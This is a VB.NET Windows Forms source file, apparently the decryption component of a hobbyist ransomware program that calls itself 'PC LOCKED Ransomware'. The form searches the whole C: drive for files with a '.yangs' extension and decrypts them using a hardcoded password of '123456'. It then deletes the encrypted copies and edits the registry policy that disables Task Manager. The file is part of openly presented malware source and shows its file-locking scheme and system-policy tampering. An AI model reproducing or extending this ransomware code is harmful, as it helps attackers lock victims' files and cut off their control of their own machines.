﻿Public Class Form6

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim filenamez As String
        Dim RegistryKey As Object

        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            MsgBox("Files Decrypted.", MsgBoxStyle.Information, "PC LOCKED Ransomware")
            RegistryKey = CreateObject("WScript.Shell")
            RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
            Application.ExitThread()


        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)

            Try
                'Declare variables for the key and iv.
                'The key needs to hold 256 bits and the iv 128 bits.
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                'Send the password to the CreateKey function.
                bytKey = Form4.CreateKey("123456")
                'Send the password to the CreateIV function.
                bytIV = Form4.CreateIV("123456")
                'Start the decryption.

                Dim withParts As String = "Books and Chapters and Pages"
                Dim filenamezu As String = Replace(filenamez, ".yangs", "")
                Form4.EncryptOrDecryptFile(filenamez, filenamezu,
                                     bytKey, bytIV, Form4.CryptoAction.ActionDecrypt)
                My.Computer.FileSystem.DeleteFile(filenamez)

            Catch ex As Exception

            End Try

            ProgressBar1.Increment(1)
            Label2.Text = filenamez
        End If
    End Sub

    Private Sub Form6_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        For Each foundFile As String In My.Computer.FileSystem.GetFiles("C:", FileIO.SearchOption.SearchAllSubDirectories)
            If foundFile.EndsWith(".yangs") Then
                ListBox1.Items.Add(foundFile)
            End If
        Next
    End Sub
End Class
